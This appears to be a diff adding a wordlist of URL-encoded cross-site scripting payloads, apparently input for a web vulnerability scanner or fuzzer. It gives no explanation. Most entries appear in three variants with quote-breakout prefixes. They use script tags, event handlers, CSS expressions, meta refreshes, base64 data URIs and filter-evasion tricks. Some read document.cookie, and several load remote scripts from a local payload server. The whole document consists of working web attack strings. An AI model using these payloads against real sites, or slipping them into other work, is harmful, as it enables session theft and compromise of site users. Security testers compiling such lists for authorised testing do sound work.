+'%3E%3Cbody%20onscroll=javascript:alert(1)%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cbr%3E%3Cinput%20autofocus%3E  
+%3CP%20STYLE=%22behavior:url('  
+%22%3E%3CP%20STYLE=%22behavior:url('  
+'%3E%3CP%20STYLE=%22behavior:url('  
+%3CSTYLE%3Ea%7Bbackground:url('s1'%20's2)%7D@import%20javascript:javascript:alert(1);');%7D%3C/STYLE%3E  
+%22%3E%3CSTYLE%3Ea%7Bbackground:url('s1'%20's2)%7D@import%20javascript:javascript:alert(1);');%7D%3C/STYLE%3E  
+'%3E%3CSTYLE%3Ea%7Bbackground:url('s1'%20's2)%7D@import%20javascript:javascript:alert(1);');%7D%3C/STYLE%3E  
+%3Cmeta%20charset=%20%22x-imap4-modified-utf7%22&&%3E&&%3Cscript&&%3Ejavascript:alert(1)&&;&&%3C&&/script&&%3E  
+%22%3E%3Cmeta%20charset=%20%22x-imap4-modified-utf7%22&&%3E&&%3Cscript&&%3Ejavascript:alert(1)&&;&&%3C&&/script&&%3E  
+'%3E%3Cmeta%20charset=%20%22x-imap4-modified-utf7%22&&%3E&&%3Cscript&&%3Ejavascript:alert(1)&&;&&%3C&&/script&&%3E  
+'%3E%3C?xml%20version=%221.0%22?%3E%3Chtml:html%20xmlns:html='http://www.w3.org/1999/xhtml'%3E%3Chtml:script%3Ejavascript:alert(1);%3C/html:script%3E%3C/html:html%3E  
+%3Cembed%20code=javascript:javascript:alert(1);%3E%3C/embed%3E  
+%22%3E%3Cembed%20code=javascript:javascript:alert(1);%3E%3C/embed%3E  
+'%3E%3Cembed%20code=javascript:javascript:alert(1);%3E%3C/embed%3E  
+%3Cframeset%20onload=javascript:javascript:alert(1)%3E%3C/frameset%3E  
+%22%3E%3Cframeset%20onload=javascript:javascript:alert(1)%3E%3C/frameset%3E  
+'%3E%3Cframeset%20onload=javascript:javascript:alert(1)%3E%3C/frameset%3E  
+%3Cobject%20onerror=javascript:javascript:alert(1)%3E  
+%22%3E%3Cobject%20onerror=javascript:javascript:alert(1)%3E  
+'%3E%3Cobject%20onerror=javascript:javascript:alert(1)%3E  
+%3CXML%20ID=I%3E%3CX%3E%3CC%3E%3C![CDATA[%3CIMG%20SRC=%22javas]]%3C![CDATA[cript:javascript:alert(1);%22%3E]]%3C/C%3E%3CX%3E%3C/xml%3E  
+%22%3E%3CXML%20ID=I%3E%3CX%3E%3CC%3E%3C![CDATA[%3CIMG%20SRC=%22javas]]%3C![CDATA[cript:javascript:alert(1);%22%3E]]%3C/C%3E%3CX%3E%3C/xml%3E  
+'%3E%3CXML%20ID=I%3E%3CX%3E%3CC%3E%3C![CDATA[%3CIMG%20SRC=%22javas]]%3C![CDATA[cript:javascript:alert(1);%22%3E]]%3C/C%3E%3CX%3E%3C/xml%3E  
+%3CIMG%20SRC=&%7Bjavascript:alert(1);%7D;%3E  
+%22%3E%3CIMG%20SRC=&%7Bjavascript:alert(1);%7D;%3E  
+'%3E%3CIMG%20SRC=&%7Bjavascript:alert(1);%7D;%3E  
+%3Ca%20href=%22jav&  
+%22%3E%3Ca%20href=%22jav&  
+'%3E%3Ca%20href=%22jav&  
+%3Ca%20href=%22jav&  
+%22%3E%3Ca%20href=%22jav&  
+'%3E%3Ca%20href=%22jav&  
+%3Ciframe%20srcdoc=%22&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;%3E%22%3E  
+%22%3E%3Ciframe%20srcdoc=%22&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;%3E%22%3E  
+'%3E%3Ciframe%20srcdoc=%22&LT;iframe&sol;srcdoc=&amp;lt;img&sol;src=&amp;apos;&amp;apos;onerror=javascript:alert(1)&amp;gt;%3E%22%3E  
+alert(String.fromCharCode(75,67,70))//%22;alert(String.fromCharCode(75,67,70))//--  
+%3E%3C/SCRIPT%3E%22%3E'%3E%3CSCRIPT%3Ealert(String.fromCharCode(88,83,83))%3C/SCRIPT%3E  
+%3CSCRIPT%20SRC=http://127.0.0.1:3555/xss_serve_payloads/X.js%3E%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%20SRC=http://127.0.0.1:3555/xss_serve_payloads/X.js%3E%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%20SRC=http://127.0.0.1:3555/xss_serve_payloads/X.js%3E%3C/SCRIPT%3E  
+%3CSCRIPT%20SRC=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%3E%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%20SRC=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%3E%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%20SRC=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%3E%3C/SCRIPT%3E  
+%3CIMG%20SRC=%22javascript:alert('X');%22%3E  
+%22%3E%3CIMG%20SRC=%22javascript:alert('X');%22%3E  
+'%3E%3CIMG%20SRC=%22javascript:alert('X');%22%3E  
+%3CIMG%20SRC=javascript:alert('X')%3E  
+%22%3E%3CIMG%20SRC=javascript:alert('X')%3E  
+'%3E%3CIMG%20SRC=javascript:alert('X')%3E  
+%3CIMG%20SRC=JaVaScRiPt:alert('X')%3E  
+%22%3E%3CIMG%20SRC=JaVaScRiPt:alert('X')%3E  
+'%3E%3CIMG%20SRC=JaVaScRiPt:alert('X')%3E  
+%3CIMG%20SRC=javascript:alert(%22X%22)%3E  
+%22%3E%3CIMG%20SRC=javascript:alert(%22X%22)%3E  
+'%3E%3CIMG%20SRC=javascript:alert(%22X%22)%3E  
+%3CIMG%20SRC=%60javascript:alert(%22X%20says,%20'X'%22)%60%3E  
+%22%3E%3CIMG%20SRC=%60javascript:alert(%22X%20says,%20'X'%22)%60%3E  
+'%3E%3CIMG%20SRC=%60javascript:alert(%22X%20says,%20'X'%22)%60%3E  
+%3Ca%20onmouseover=%22alert(document.cookie)%22%3EX%20link%3C/a%3E  
+%22%3E%3Ca%20onmouseover=%22alert(document.cookie)%22%3EX%20link%3C/a%3E  
+'%3E%3Ca%20onmouseover=%22alert(document.cookie)%22%3EX%20link%3C/a%3E  
+%3Ca%20onmouseover=alert(document.cookie)%3EX%20link%3C/a%3E  
+%22%3E%3Ca%20onmouseover=alert(document.cookie)%3EX%20link%3C/a%3E  
+'%3E%3Ca%20onmouseover=alert(document.cookie)%3EX%20link%3C/a%3E  
+%3CIMG%20%22%22%22%3E%3CSCRIPT%3Ealert(%22X%22)%3C/SCRIPT%3E%22%3E  
+%22%3E%3CIMG%20%22%22%22%3E%3CSCRIPT%3Ealert(%22X%22)%3C/SCRIPT%3E%22%3E  
+'%3E%3CIMG%20%22%22%22%3E%3CSCRIPT%3Ealert(%22X%22)%3C/SCRIPT%3E%22%3E  
+%3CIMG%20SRC=%20onmouseover=%22alert('X')%22%3E  
+%22%3E%3CIMG%20SRC=%20onmouseover=%22alert('X')%22%3E  
+'%3E%3CIMG%20SRC=%20onmouseover=%22alert('X')%22%3E  
+%3CIMG%20onmouseover=%22alert('X')%22%3E  
+%22%3E%3CIMG%20onmouseover=%22alert('X')%22%3E  
+'%3E%3CIMG%20onmouseover=%22alert('X')%22%3E  
+%3CIMG%20SRC=%22jav&  
+%22%3E%3CIMG%20SRC=%22jav&  
+'%3E%3CIMG%20SRC=%22jav&  
+%3CIMG%20SRC=%22jav&  
+%22%3E%3CIMG%20SRC=%22jav&  
+'%3E%3CIMG%20SRC=%22jav&  
+perl%20-e%20'print%20%22%3CIMG%20SRC=java/0script:alert(/%22X/%22)%3E%22;'%20%3E%20out  
+%3CIMG%20SRC=%22%20&  
+%22%3E%3CIMG%20SRC=%22%20&  
+'%3E%3CIMG%20SRC=%22%20&  
+%3CSCRIPT/X%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT/X%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+'%3E%3CSCRIPT/X%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+%3CSCRIPT/X%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT/X%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+'%3E%3CSCRIPT/X%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+%3CSCRIPT/SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT/SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+'%3E%3CSCRIPT/SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/SCRIPT%3E  
+%3CSCRIPT/SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT/SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+'%3E%3CSCRIPT/SRC=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/SCRIPT%3E  
+%3C%3CSCRIPT%3Ealert(%22X%22);//%3C%3C/SCRIPT%3E  
+%22%3E%3C%3CSCRIPT%3Ealert(%22X%22);//%3C%3C/SCRIPT%3E  
+'%3E%3C%3CSCRIPT%3Ealert(%22X%22);//%3C%3C/SCRIPT%3E  
+%3CSCRIPT%20SRC=http://127.0.0.1:3555/xss_serve_payloads/X.js%3C%20B%20%3E  
+%22%3E%3CSCRIPT%20SRC=http://127.0.0.1:3555/xss_serve_payloads/X.js%3C%20B%20%3E  
+'%3E%3CSCRIPT%20SRC=http://127.0.0.1:3555/xss_serve_payloads/X.js%3C%20B%20%3E  
+%3CSCRIPT%20SRC=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%3C%20B%20%3E  
+%22%3E%3CSCRIPT%20SRC=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%3C%20B%20%3E  
+'%3E%3CSCRIPT%20SRC=http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%3C%20B%20%3E  
+%3CSCRIPT%20SRC=//127.0.0.1:3555/xss_serve_payloads/.j%3E  
+%22%3E%3CSCRIPT%20SRC=//127.0.0.1:3555/xss_serve_payloads/.j%3E  
+'%3E%3CSCRIPT%20SRC=//127.0.0.1:3555/xss_serve_payloads/.j%3E  
+%3CIMG%20SRC=%22javascript:alert('X')%22  
+%22%3E%3CIMG%20SRC=%22javascript:alert('X')%22  
+'%3E%3CIMG%20SRC=%22javascript:alert('X')%22  
+%3C/TITLE%3E%3CSCRIPT%3Ealert(%22X%22);%3C/SCRIPT%3E  
+%22%3E%3C/TITLE%3E%3CSCRIPT%3Ealert(%22X%22);%3C/SCRIPT%3E  
+'%3E%3C/TITLE%3E%3CSCRIPT%3Ealert(%22X%22);%3C/SCRIPT%3E  
+%3CINPUT%20TYPE=%22IMAGE%22%20SRC=%22javascript:alert('X');%22%3E  
+%22%3E%3CINPUT%20TYPE=%22IMAGE%22%20SRC=%22javascript:alert('X');%22%3E  
+'%3E%3CINPUT%20TYPE=%22IMAGE%22%20SRC=%22javascript:alert('X');%22%3E  
+%3CBODY%20BACKGROUND=%22javascript:alert('X')%22%3E  
+%22%3E%3CBODY%20BACKGROUND=%22javascript:alert('X')%22%3E  
+'%3E%3CBODY%20BACKGROUND=%22javascript:alert('X')%22%3E  
+%3CIMG%20DYNSRC=%22javascript:alert('X')%22%3E  
+%22%3E%3CIMG%20DYNSRC=%22javascript:alert('X')%22%3E  
+'%3E%3CIMG%20DYNSRC=%22javascript:alert('X')%22%3E  
+%3CIMG%20LOWSRC=%22javascript:alert('X')%22%3E  
+%22%3E%3CIMG%20LOWSRC=%22javascript:alert('X')%22%3E  
+'%3E%3CIMG%20LOWSRC=%22javascript:alert('X')%22%3E  
+%3CSTYLE%3Eli%20%7Blist-style-image:%20url(%22javascript:alert('X')%22);%7D%3C/STYLE%3E%3CUL%3E%3CLI%3EX%3C/br%3E  
+%22%3E%3CSTYLE%3Eli%20%7Blist-style-image:%20url(%22javascript:alert('X')%22);%7D%3C/STYLE%3E%3CUL%3E%3CLI%3EX%3C/br%3E  
+'%3E%3CSTYLE%3Eli%20%7Blist-style-image:%20url(%22javascript:alert('X')%22);%7D%3C/STYLE%3E%3CUL%3E%3CLI%3EX%3C/br%3E  
+%3CIMG%20SRC='vbscript:msgbox(%22X%22)'%3E  
+%22%3E%3CIMG%20SRC='vbscript:msgbox(%22X%22)'%3E  
+'%3E%3CIMG%20SRC='vbscript:msgbox(%22X%22)'%3E  
+%3CIMG%20SRC=%22livescript:[code]%22%3E  
+%22%3E%3CIMG%20SRC=%22livescript:[code]%22%3E  
+'%3E%3CIMG%20SRC=%22livescript:[code]%22%3E  
+%3CBODY%20ONLOAD=alert('X')%3E  
+%22%3E%3CBODY%20ONLOAD=alert('X')%3E  
+'%3E%3CBODY%20ONLOAD=alert('X')%3E  
+%3CBGSOUND%20SRC=%22javascript:alert('X');%22%3E  
+%22%3E%3CBGSOUND%20SRC=%22javascript:alert('X');%22%3E  
+'%3E%3CBGSOUND%20SRC=%22javascript:alert('X');%22%3E  
+%3CBR%20SIZE=%22&%7Balert('X')%7D%22%3E  
+%22%3E%3CBR%20SIZE=%22&%7Balert('X')%7D%22%3E  
+'%3E%3CBR%20SIZE=%22&%7Balert('X')%7D%22%3E  
+%3CLINK%20REL=%22stylesheet%22%20HREF=%22javascript:alert('X');%22%3E  
+%22%3E%3CLINK%20REL=%22stylesheet%22%20HREF=%22javascript:alert('X');%22%3E  
+'%3E%3CLINK%20REL=%22stylesheet%22%20HREF=%22javascript:alert('X');%22%3E  
+%3CSTYLE%3EBODY%7B-moz-binding:url(%22http://127.0.0.1:3555/xss_serve_payloads/X.xml  
+%22%3E%3CSTYLE%3EBODY%7B-moz-binding:url(%22http://127.0.0.1:3555/xss_serve_payloads/X.xml  
+'%3E%3CSTYLE%3EBODY%7B-moz-binding:url(%22http://127.0.0.1:3555/xss_serve_payloads/X.xml  
+%3CSTYLE%3E@im/port'/ja/vasc/ript:alert(%22X%22)';%3C/STYLE%3E  
+%22%3E%3CSTYLE%3E@im/port'/ja/vasc/ript:alert(%22X%22)';%3C/STYLE%3E  
+'%3E%3CSTYLE%3E@im/port'/ja/vasc/ript:alert(%22X%22)';%3C/STYLE%3E  
+%3CIMG%20STYLE=%22X:expr/*X*/ession(alert('X'))%22%3E  
+%22%3E%3CIMG%20STYLE=%22X:expr/*X*/ession(alert('X'))%22%3E  
+'%3E%3CIMG%20STYLE=%22X:expr/*X*/ession(alert('X'))%22%3E  
+%3CSTYLE%20TYPE=%22text/javascript%22%3Ealert('X');%3C/STYLE%3E  
+%22%3E%3CSTYLE%20TYPE=%22text/javascript%22%3Ealert('X');%3C/STYLE%3E  
+'%3E%3CSTYLE%20TYPE=%22text/javascript%22%3Ealert('X');%3C/STYLE%3E  
+%3CSTYLE%3E.X%7Bbackground-image:url(%22javascript:alert('X')%22);%7D%3C/STYLE%3E%3CA%20CLASS=X%3E%3C/A%3E  
+%22%3E%3CSTYLE%3E.X%7Bbackground-image:url(%22javascript:alert('X')%22);%7D%3C/STYLE%3E%3CA%20CLASS=X%3E%3C/A%3E  
+'%3E%3CSTYLE%3E.X%7Bbackground-image:url(%22javascript:alert('X')%22);%7D%3C/STYLE%3E%3CA%20CLASS=X%3E%3C/A%3E  
+%22%3E%3CA%20CLASS=X%3E%3C/A%3E  
+'%3E%3CA%20CLASS=X%3E%3C/A%3E  
+%3CSTYLE%20type=%22text/css%22%3EBODY%7Bbackground:url(%22javascript:alert('X')%22)%7D%3C/STYLE%3E  
+%22%3E%3CSTYLE%20type=%22text/css%22%3EBODY%7Bbackground:url(%22javascript:alert('X')%22)%7D%3C/STYLE%3E  
+'%3E%3CSTYLE%20type=%22text/css%22%3EBODY%7Bbackground:url(%22javascript:alert('X')%22)%7D%3C/STYLE%3E  
+%3CX%20STYLE=%22X:expression(alert('X'))%22%3E  
+%22%3E%3CX%20STYLE=%22X:expression(alert('X'))%22%3E  
+'%3E%3CX%20STYLE=%22X:expression(alert('X'))%22%3E  
+%3CX%20STYLE=%22behavior:%20url(X.htc);%22%3E  
+%22%3E%3CX%20STYLE=%22behavior:%20url(X.htc);%22%3E  
+'%3E%3CX%20STYLE=%22behavior:%20url(X.htc);%22%3E  
+%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;url=javascript:alert('X');%22%3E  
+%22%3E%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;url=javascript:alert('X');%22%3E  
+'%3E%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;url=javascript:alert('X');%22%3E  
+%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;url=data:text/html%20base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%3E  
+%22%3E%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;url=data:text/html%20base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%3E  
+'%3E%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;url=data:text/html%20base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%3E  
+%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;%20URL=http://;URL=javascript:alert('X');%22%3E  
+%22%3E%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;%20URL=http://;URL=javascript:alert('X');%22%3E  
+'%3E%3CMETA%20HTTP-EQUIV=%22refresh%22%20CONTENT=%220;%20URL=http://;URL=javascript:alert('X');%22%3E  
+%3CIFRAME%20SRC=%22javascript:alert('X');%22%3E%3C/IFRAME%3E  
+%22%3E%3CIFRAME%20SRC=%22javascript:alert('X');%22%3E%3C/IFRAME%3E  
+'%3E%3CIFRAME%20SRC=%22javascript:alert('X');%22%3E%3C/IFRAME%3E  
+%3CIFRAME%20SRC=  
+%22%3E%3CIFRAME%20SRC=  
+'%3E%3CIFRAME%20SRC=  
+%3CFRAMESET%3E%3CFRAME%20SRC=%22javascript:alert('X');%22%3E%3C/FRAMESET%3E  
+%22%3E%3CFRAMESET%3E%3CFRAME%20SRC=%22javascript:alert('X');%22%3E%3C/FRAMESET%3E  
+'%3E%3CFRAMESET%3E%3CFRAME%20SRC=%22javascript:alert('X');%22%3E%3C/FRAMESET%3E  
+%3CTABLE%20BACKGROUND=%22javascript:alert('X')%22%3E  
+%22%3E%3CTABLE%20BACKGROUND=%22javascript:alert('X')%22%3E  
+'%3E%3CTABLE%20BACKGROUND=%22javascript:alert('X')%22%3E  
+%3CTABLE%3E%3CTD%20BACKGROUND=%22javascript:alert('X')%22%3E  
+%22%3E%3CTABLE%3E%3CTD%20BACKGROUND=%22javascript:alert('X')%22%3E  
+'%3E%3CTABLE%3E%3CTD%20BACKGROUND=%22javascript:alert('X')%22%3E  
+%3CDIV%20STYLE=%22background-image:%20url(javascript:alert('X'))%22%3E  
+%22%3E%3CDIV%20STYLE=%22background-image:%20url(javascript:alert('X'))%22%3E  
+'%3E%3CDIV%20STYLE=%22background-image:%20url(javascript:alert('X'))%22%3E  
+%3CDIV%20STYLE=%22background-image:%20url(&  
+%22%3E%3CDIV%20STYLE=%22background-image:%20url(&  
+'%3E%3CDIV%20STYLE=%22background-image:%20url(&  
+%3CDIV%20STYLE=%22width:%20expression(alert('X'));%22%3E  
+%22%3E%3CDIV%20STYLE=%22width:%20expression(alert('X'));%22%3E  
+'%3E%3CDIV%20STYLE=%22width:%20expression(alert('X'));%22%3E  
+%3CBASE%20HREF=%22javascript:alert('X');//%22%3E  
+%22%3E%3CBASE%20HREF=%22javascript:alert('X');//%22%3E  
+'%3E%3CBASE%20HREF=%22javascript:alert('X');//%22%3E  
+%3Cobject%20type=%22text/x-scriptlet%22%20data=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/object%3E  
+%22%3E%3Cobject%20type=%22text/x-scriptlet%22%20data=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/object%3E  
+'%3E%3Cobject%20type=%22text/x-scriptlet%22%20data=%22http://127.0.0.1:3555/xss_serve_payloads/X.js%22%3E%3C/object%3E  
+%3Cobject%20type=%22text/x-scriptlet%22%20data=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/object%3E  
+%22%3E%3Cobject%20type=%22text/x-scriptlet%22%20data=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/object%3E  
+'%3E%3Cobject%20type=%22text/x-scriptlet%22%20data=%22http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp%22%3E%3C/object%3E  
+%3COBJECT%20TYPE=%22text/x-scriptlet%22%20DATA=%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22%3E%3C/OBJECT%3E  
+%22%3E%3COBJECT%20TYPE=%22text/x-scriptlet%22%20DATA=%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22%3E%3C/OBJECT%3E  
+'%3E%3COBJECT%20TYPE=%22text/x-scriptlet%22%20DATA=%22http://127.0.0.1:3555/xss_serve_payloads/X.html%22%3E%3C/OBJECT%3E  
+%3CEMBED%20SRC=%22data:image/svg+xml;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%20type=%22image/svg+xml%22%20AllowScriptAccess=%22always%22%3E%3C/EMBED%3E  
+%22%3E%3CEMBED%20SRC=%22data:image/svg+xml;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%20type=%22image/svg+xml%22%20AllowScriptAccess=%22always%22%3E%3C/EMBED%3E  
+'%3E%3CEMBED%20SRC=%22data:image/svg+xml;base64,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%20type=%22image/svg+xml%22%20AllowScriptAccess=%22always%22%3E%3C/EMBED%3E  
+%3CSCRIPT%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.jpg%22%3E%3C/SCRIPT%3E  
+%22%3E%3CSCRIPT%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.jpg%22%3E%3C/SCRIPT%3E  
+'%3E%3CSCRIPT%20SRC=%22http://127.0.0.1:3555/xss_serve_payloads/X.jpg%22%3E%3C/SCRIPT%3E  
+%3C!--  
+%22%3E%3C!--  
+'%3E%3C!--  
+%3C!--  
+%22%3E%3C!--  
+'%3E%3C!--  
+%3C?%20echo('%3CSCR)';echo('IPT%3Ealert(%22X%22)%3C/SCRIPT%3E');%20?%3E  
+%22%3E%3C?%20echo('%3CSCR)';echo('IPT%3Ealert(%22X%22)%3C/SCRIPT%3E');%20?%3E  
+'%3E%3C?%20echo('%3CSCR)';echo('IPT%3Ealert(%22X%22)%3C/SCRIPT%3E');%20?%3E  
+Redirect%20302%20/axaaX.jpg%20http://127.0.0.1:3555/xss_serve_payloads/X.html  
+%3CMETA%20HTTP-EQUIV=%22Set-Cookie%22%20Content=%22USERID=%3CSCRIPT%3Ealert('X')%3C/SCRIPT%3E%22%3E  
+%22%3E%3CMETA%20HTTP-EQUIV=%22Set-Cookie%22%20Content=%22USERID=%3CSCRIPT%3Ealert('X')%3C/SCRIPT%3E%22%3E  
+'%3E%3CMETA%20HTTP-EQUIV=%22Set-Cookie%22%20Content=%22USERID=%3CSCRIPT%3Ealert('X')%3C/SCRIPT%3E%22%3E  
+%20%3CHEAD%3E%3CMETA%20HTTP-EQUIV=%22CONTENT-TYPE%22%20CONTENT=%22text/html;%20charset=UTF-7%22%3E%20%3C/HEAD%3E+ADw-SCRIPT+AD4-alert('X');+ADw-/SCRIPT+AD4-  
+%3CA%20HREF=%22http://127.0.0.1/%22%3EX%3C/A%3E  
+%22%3E%3CA%20HREF=%22http://127.0.0.1/%22%3EX%3C/A%3E  
+'%3E%3CA%20HREF=%22http://127.0.0.1/%22%3EX%3C/A%3E  
+%3CA%20HREF=%22http://0x42.0x0000066.0x7.0x93/%22%3EX%3C/A%3E  
+%22%3E%3CA%20HREF=%22http://0x42.0x0000066.0x7.0x93/%22%3EX%3C/A%3E  
+'%3E%3CA%20HREF=%22http://0x42.0x0000066.0x7.0x93/%22%3EX%3C/A%3E  
+%3CA%20HREF=%22http://0102.0146.0007.00000223/%22%3EX%3C/A%3E  
+%22%3E%3CA%20HREF=%22http://0102.0146.0007.00000223/%22%3EX%3C/A%3E  
+'%3E%3CA%20HREF=%22http://0102.0146.0007.00000223/%22%3EX%3C/A%3E  
+%3CA%20HREF=%22http://66.000146.0x7.147/%22%3EX%3C/A%3E  
+%22%3E%3CA%20HREF=%22http://66.000146.0x7.147/%22%3EX%3C/A%3E  
+'%3E%3CA%20HREF=%22http://66.000146.0x7.147/%22%3EX%3C/A%3E  
+%3Csvg%3E%3Cstyle%3E%7Bfont-family&colon;'%3Ciframe/onload=confirm(1)%3E'  
+%22%3E%3Csvg%3E%3Cstyle%3E%7Bfont-family&colon;'%3Ciframe/onload=confirm(1)%3E'  
+'%3E%3Csvg%3E%3Cstyle%3E%7Bfont-family&colon;'%3Ciframe/onload=confirm(1)%3E'  
+%3Cinput/onmouseover=%22javaSCRIPT&colon;confirm&lpar;1&rpar;%22  
+%22%3E%3Cinput/onmouseover=%22javaSCRIPT&colon;confirm&lpar;1&rpar;%22  
+'%3E%3Cinput/onmouseover=%22javaSCRIPT&colon;confirm&lpar;1&rpar;%22  
+%3Cform%3E%3Cisindex%20formaction=%22javascript&colon;confirm(1)%22  
+%22%3E%3Cform%3E%3Cisindex%20formaction=%22javascript&colon;confirm(1)%22  
+'%3E%3Cform%3E%3Cisindex%20formaction=%22javascript&colon;confirm(1)%22  
+%3Cscript/&Tab;%20src='http://127.0.0.1:3555/xss_serve_payloads/X.js'%20/&Tab;%3E%3C/script%3E  
+%22%3E%3Cscript/&Tab;%20src='http://127.0.0.1:3555/xss_serve_payloads/X.js'%20/&Tab;%3E%3C/script%3E  
+'%3E%3Cscript/&Tab;%20src='http://127.0.0.1:3555/xss_serve_payloads/X.js'%20/&Tab;%3E%3C/script%3E  
+%3Cscript/&Tab;%20src='http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp'%20/&Tab;%3E%3C/script%3E  
+%22%3E%3Cscript/&Tab;%20src='http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp'%20/&Tab;%3E%3C/script%3E  
+'%3E%3Cscript/&Tab;%20src='http://127.0.0.1:3555/xss_serve_payloads/bmpz.bmp'%20/&Tab;%3E%3C/script%3E  
+%3CScRipT%205-0*3+9/3=%3Eprompt(1)%3C/ScRipT%20giveanswerhere=?  
+%22%3E%3CScRipT%205-0*3+9/3=%3Eprompt(1)%3C/ScRipT%20giveanswerhere=?  
+'%3E%3CScRipT%205-0*3+9/3=%3Eprompt(1)%3C/ScRipT%20giveanswerhere=?  
+%3Ciframe/src=%22data:text/html;&Tab;base64&Tab;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%3E  
+%22%3E%3Ciframe/src=%22data:text/html;&Tab;base64&Tab;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%3E  
+'%3E%3Ciframe/src=%22data:text/html;&Tab;base64&Tab;,PGltZyBzcmM9eCBvbmVycm9yPWFsZXJ0KDEpPg==%22%3E  
+&  
+%3Ciframe/src=%22data:text/html,%3Csvg%20&  
+%22%3E%3Ciframe/src=%22data:text/html,%3Csvg%20&  
+'%3E%3Ciframe/src=%22data:text/html,%3Csvg%20&  
+%3Cmeta%20content=%22&NewLine;%201%20&NewLine;;%20JAVASCRIPT&colon;%20alert(1)%22%20http-equiv=%22refresh%22/%3E  
+%22%3E%3Cmeta%20content=%22&NewLine;%201%20&NewLine;;%20JAVASCRIPT&colon;%20alert(1)%22%20http-equiv=%22refresh%22/%3E  
+'%3E%3Cmeta%20content=%22&NewLine;%201%20&NewLine;;%20JAVASCRIPT&colon;%20alert(1)%22%20http-equiv=%22refresh%22/%3E  
+%3Csvg%3E%3Cscript%20xlink:href=data&colon;,window.open('https://127.0.0.1:3555/xss_serve_payloads/X.html')%3E%3C/script  
+%22%3E%3Csvg%3E%3Cscript%20xlink:href=data&colon;,window.open('https://127.0.0.1:3555/xss_serve_payloads/X.html')%3E%3C/script  
+'%3E%3Csvg%3E%3Cscript%20xlink:href=data&colon;,window.open('https://127.0.0.1:3555/xss_serve_payloads/X.html')%3E%3C/script  
+%3Csvg%3E%3Cscript%20x:href='http://127.0.0.1:3555/xss_serve_payloads/X.js'  
